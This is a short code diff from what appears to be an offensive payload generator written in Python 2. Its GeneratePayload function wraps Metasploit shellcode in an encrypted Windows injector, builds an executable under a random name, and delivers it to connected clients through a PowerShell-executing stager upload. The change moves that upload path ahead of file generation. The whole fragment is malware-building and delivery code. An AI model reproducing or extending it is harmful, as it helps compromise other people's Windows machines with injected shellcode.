@@ -59,6 +59,12 @@ def askAndReturnModules(shellcode, metasploit_type):
         return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
 
 def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
+    from menu import clientMenuOptions
+    if len(clientMenuOptions.keys()) > 2:
+        from stager import clientUpload
+        if clientUpload(powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}'):
+            return True
+
     randoFileName = ''.join(random.sample(string.ascii_lowercase, 8))
     with open('%s/%s.py' % (payloaddir(), randoFileName), 'w+') as Filesave:
         Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
@@ -87,12 +93,7 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
 
     print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), randoFileName) + t.normal
     CleanUpPayloadMess(randoFileName)
-    from menu import clientMenuOptions
-    if len(clientMenuOptions.keys()) > 2:
-        from stager import clientUpload
-        clientUpload((payloaddir() + '/' + randoFileName), powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}')
-    else:
-        DoPayloadUpload(randoFileName)
+    DoPayloadUpload(randoFileName)
     return True
 
 
